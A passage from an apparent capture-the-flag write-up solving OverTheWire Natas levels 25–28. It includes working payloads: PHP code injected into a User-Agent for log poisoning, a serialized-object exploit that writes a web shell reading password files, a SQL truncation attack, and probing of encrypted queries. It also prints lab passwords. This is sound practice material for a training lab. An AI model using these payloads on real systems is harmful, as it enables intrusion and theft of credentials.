> [25.10.2024 04::56:32] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:33] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:33] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::06:02] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::07:37] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::09:40] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::16:34] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:46] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:52] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::18:06] [UNDISCLOSED] "Directory traversal attempt! fixing request."

That is interesting.

Moreover, the function `logRequest` writes in the log file the value of `$_SERVER['HTTP_USER_AGENT']`. Can we tamper it?

Using Burp, the base request is:

```
GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

We can execute system commands in PHP using `exec`, as [here](https://www.php.net/manual/en/function.exec.php) explained:

```php
<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('whoami', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
```

We replace the User Agent with `User-Agent: <?php echo exec('whoami');?>` getting:

```
GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php echo exec('whoami');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

In the logs:

```
[25.10.2024 05::32:52] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request."
```

When understood, this whole process can be automated in a script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

url = "http://natas25.natas.labs.overthewire.org/"


def send_request() -> str:
    first_url = url + f"?lang=de"
    print(f"Sending request to [{first_url}]...")
    user_agent = "<?php echo shell_exec('cat /etc/natas_webpass/natas26');?>"
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'User-Agent': user_agent}
    session = requests.Session()
    _ = session.get(first_url,
                    headers=headers,
                    auth=basic_auth,
                    verify=False)
    session_id = session.cookies.get_dict()['PHPSESSID']
    second_url = url + \
        f"?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_{session_id}.log"
    response = session.get(second_url,
                           headers=headers,
                           auth=basic_auth,
                           verify=False)
    return response.text


if __name__ == '__main__':
    print(send_request())
```

## Natas 26

### Credentials

Username: natas26

Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

URL: http://natas26.natas.labs.overthewire.org

### Message

The page says:

> Draw a line:

and requires X1, Y1, X2, Y2.

There is a link to the source code.

### Solution

The source code linked:

```html
<html>
  <head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link
      rel="stylesheet"
      type="text/css"
      href="http://natas.labs.overthewire.org/css/level.css"
    />
    <link
      rel="stylesheet"
      href="http://natas.labs.overthewire.org/css/jquery-ui.css"
    />
    <link
      rel="stylesheet"
      href="http://natas.labs.overthewire.org/css/wechall.css"
    />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>
      var wechallinfo = { level: "natas26", pass: "<censored>" };
    </script>
  </head>
  <body>
    <?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n"; $this->exitMsg="#--session
    end--#\n"; $this->logFile = "/tmp/natas26_" . $file . ".log"; // write
    initial message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->initMsg);
    fclose($fd); } function log($msg){ $fd=fopen($this->logFile,"a+");
    fwrite($fd,$msg."\n"); fclose($fd); } function __destruct(){ // write exit
    message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->exitMsg);
    fclose($fd); } } function showImage($filename){ if(file_exists($filename))
    echo "<img src=\"$filename\">"; } function drawImage($filename){
    $img=imagecreatetruecolor(400,300); drawFromUserdata($img);
    imagepng($img,$filename); imagedestroy($img); } function
    drawFromUserdata($img){ if( array_key_exists("x1", $_GET) &&
    array_key_exists("y1", $_GET) && array_key_exists("x2", $_GET) &&
    array_key_exists("y2", $_GET)){
    $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET["x1"],
    $_GET["y1"], $_GET["x2"], $_GET["y2"], $color); } if
    (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); if($drawing)
    foreach($drawing as $object) if( array_key_exists("x1", $object) &&
    array_key_exists("y1", $object) && array_key_exists("x2", $object) &&
    array_key_exists("y2", $object)){
    $color=imagecolorallocate($img,0xff,0x12,0x1c);
    imageline($img,$object["x1"],$object["y1"], $object["x2"] ,$object["y2"]
    ,$color); } } } function storeData(){ $new_object=array();
    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
    array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
    $new_object["x1"]=$_GET["x1"]; $new_object["y1"]=$_GET["y1"];
    $new_object["x2"]=$_GET["x2"]; $new_object["y2"]=$_GET["y2"]; } if
    (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); } else{ // create
    new array $drawing=array(); } $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing))); } ?>

    <h1>natas26</h1>
    <div id="content">
      Draw a line:<br />
      <form name="input" method="get">
        X1<input type="text" name="x1" size="2" /> Y1<input
          type="text"
          name="y1"
          size="2"
        />
        X2<input type="text" name="x2" size="2" /> Y2<input
          type="text"
          name="y2"
          size="2"
        />
        <input type="submit" value="DRAW!" />
      </form>

      <?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>

      <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
  </body>
</html>
```

In particular, the PHP part:

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```

and

```php
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Inserting X1, Y1, X2 and Y2, the request goes to `http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2`. There is a cookie called `drawing` with value (e.g.) `YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319` and another called `PHPSESSID` with value `0o8fjas5n6i6f4l8jgipiegq9l`.

Reading the code, notice in the function `drawFromUserdata`:

```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    if($drawing)
        foreach($drawing as $object)
            if( array_key_exists("x1", $object) &&
                array_key_exists("y1", $object) &&
                array_key_exists("x2", $object) &&
                array_key_exists("y2", $object)){

                $color=imagecolorallocate($img,0xff,0x12,0x1c);
                imageline($img,$object["x1"],$object["y1"],
                        $object["x2"] ,$object["y2"] ,$color);

            }
}
```

Thus the cookie `drawing` is base 64 encoded data! Decode it using [CyberChef](https://cyberchef.org/) or the command `base64` and get:

```
YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319
```

is

```
a:1:{i:0;a:4:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:1:"2";s:2:"y2";s:1:"2";}}
```

```php
<?php

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct() {
        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_[SESSION_ID].php";
    }
}

$logger = new Logger();

echo base64_encode(serialize($logger));
?>
```

This produces base 64 encoded data.

Replace the `drawing` cookie with this data and then visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.

Visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.

Given the session ID `rnhdh9ujn7qlaur1nf17umi8ec`,

```php
<?php

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct() {
        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php";
    }
}

$logger = new Logger();

echo base64_encode(serialize($logger));
?>
```

This produces the output `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ybmhkaDl1am43cWxhdXIxbmYxN3VtaThlYy5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MzoiPD9waHAgZWNobyBleGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=`,
which we set in `drawing`. Draw something specifying the coordinates as required.

Visit `http://natas26.natas.labs.overthewire.org/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php`.

This gives the value `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.

## Natas 27

### Credentials

Username: natas27

Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

URL: http://natas27.natas.labs.overthewire.org

### Message

The page requires a username and a password.

There is a link to the source code.

### Solution

Inserting a username and a password, a POST request is made to `http://natas27.natas.labs.overthewire.org/index.php` with body:

```
username=asd&password=dsa
```

It seems that this creates a user:

> User asd was created!

The page source code is the following:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP code:

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
```

In particular, there is a SQL database with table `users` defined as:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

A function checks the credentials:

```php

function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

Another function validates the user:

```php
function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```

There is an interesting function that returns all the columns for a given user:

```php
function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

Finally, a function to create a user:

```php
function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}
```

The main function defines the flow:

```php

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
```

Inserting again the credentials for the user `asd` (`asd:dsa`) as above:

> Welcome asd!
> Here is your data:
> Array ( [username] => asd [password] => dsa )

Inserting a wrong password:

> Wrong password for user: asd

If we try with the user `natas28` and the password `asd` we get:

> Wrong password for user: natas28

Craft and use the following script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')

url = "http://natas27.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, username, password) -> str:
    body = {"username": username, "password": password}
    response = session.post(url,
                    headers=headers,
                    data=body)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    natas28 = "natas28"
    padding = " " * (64 - len(natas28))
    username = natas28 + padding
    password = ""
    print(send_request(session, username + "x", password))
    print(send_request(session, username, password))
```

This gives in the output:

> Welcome natas28 !<br>Here is your data:<br>Array
> (
> [username] =&gt; natas28
> [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
> )

## Natas 28

### Credentials

Username: natas28

Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

URL: http://natas28.natas.labs.overthewire.org

### Message

> Whack Computer Joke Database

There is a **Search** field.

Under it there is the message:

> sorry, we are currently out of sauce

### Solution

Input the string `asd` in the search and get:

> Two strings walk into a bar and sit down. The bartender says, "So what'll it be?"
> The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8
> "Please excuse my friend," the second string says. "He isn't null-terminated."

Input `asd' or 1=1 --` and get a blank page.

The URL is:

```
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLei%2B6aGQjSnxLGTCg1BXadJoN0j36x2764CKTMbTEKFadz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
```

This is interesting...

Remove a letter from the part following `query=` in the URL:

```
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
```

becomes

```
natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0QpdcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
```

This gives the error:

> Notice: Trying to access array offset on value of type bool in **/var/www/natas/natas28/search.php** on line 59
> Zero padding found instead of PKCS#7 padding

Googling this error: it seems to be connected with some cryptographic issue.

Try to script:

A first script just to get a response from a request with query `asd`:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    query = "asd"
    print(send_request(session, query))
```

We can print the `query` parameter:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    return response.url.split("=")[1]

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    query = "asd"
    print(send_request(session, query))
```

and get:

```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKg9sQ0V8wVl%2FPPsvF1L%2Fzemi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D
```

This is URL-encoded...

```python
import requests
import urllib
from requests.auth import HTTPBasicAuth


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    query = "asd"
    print(send_request(session, query))
```

Iterate over the length of the query:

```python
import requests
import urllib
from requests.auth import HTTPBasicAuth


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    query = ""
    for i in range(32):
        query += "a"
        print(send_request(session, query))
```

This gives:

```
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
